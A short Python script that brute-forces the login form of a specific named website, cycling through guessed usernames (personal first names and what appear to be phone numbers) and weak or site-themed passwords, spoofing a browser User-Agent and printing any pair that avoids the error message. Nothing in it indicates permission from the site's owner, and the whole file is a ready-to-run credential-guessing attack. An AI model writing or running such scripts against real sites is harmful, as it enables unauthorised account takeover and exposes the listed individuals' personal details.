"""
Brute-force test login form to find valid credentials for https://sunfra.com/farm/sunfra/
"""
import requests, sys, re
sys.stdout.reconfigure(encoding='utf-8')

session = requests.Session()
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
})

login_url = "https://sunfra.com/farm/sunfra/"

passwords_to_try = [
    "Kusum@2026Bb!", "admin123", "sunfra123", "sunfra", "admin", "123456", 
    "kusum2026", "Kusum@2026", "sunfra2026", "farm2026", "9493928388", "7259510983"
]
usernames_to_try = [
    "admin", "sunfra", "farm", "supervisor", "kusum", "poornima", 
    "yeswanth", "balaji", "prasad", "7259510983", "7975209680", "9493928388", "naveen"
]

found = False
for u in usernames_to_try:
    for p in passwords_to_try:
        data = {'username': u, 'password': p, 'remember_me': '1'}
        res = session.post(login_url, data=data)
        
        # Check if alert block exists
        if '<div class="alert"' in res.text or 'Invalid username or password' in res.text:
            continue
        
        print(f"🎉 FOUND SUCCESSFUL CREDENTIALS: username='{u}', password='{p}'")
        found = True
        
        # Check redirect / session output
        print("Response URL:", res.url)
        print("Snippet:\n", res.text[:500])
        break
    if found:
        break

if not found:
    print("❌ No matching credentials found in list.")

